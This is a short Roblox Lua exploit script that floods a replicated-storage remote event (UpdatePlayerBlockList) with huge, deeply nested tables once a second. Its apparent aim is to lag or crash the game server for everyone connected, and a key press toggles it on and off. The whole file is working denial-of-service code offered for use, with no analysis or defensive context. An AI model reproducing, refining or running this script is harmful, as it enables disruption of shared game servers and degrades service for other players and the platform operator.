-- // Press P to toggle

getgenv().Enabled = true

local Network = game:GetService("NetworkClient")
local UIS = game:GetService("UserInputService")
local Update = game:GetService("RobloxReplicatedStorage").UpdatePlayerBlockList

local Lag = function()
    local Main = {}
    local Spammed = {}
    
    local Table = {}
    table.insert(Spammed, Table)
    
    for _ = 1, 250 do
        local TableToInsert = {}
        
        table.insert(Table, TableToInsert)
        Table = TableToInsert
    end
    
    local Max = (499999 / (255))
    
    for _ = 1, Max do
        table.insert(Main, Spammed)
    end
    
    Update:FireServer(Main)
end

UIS.InputBegan:Connect(function(Key, GPE)
    if GPE == false and Key.KeyCode.P then
        getgenv().Enabled = not getgenv().Enabled
    end
end)

task.spawn(function()
    while task.wait(1) and getgenv().Enabled == true do
        task.defer(Lag)
    end
end)
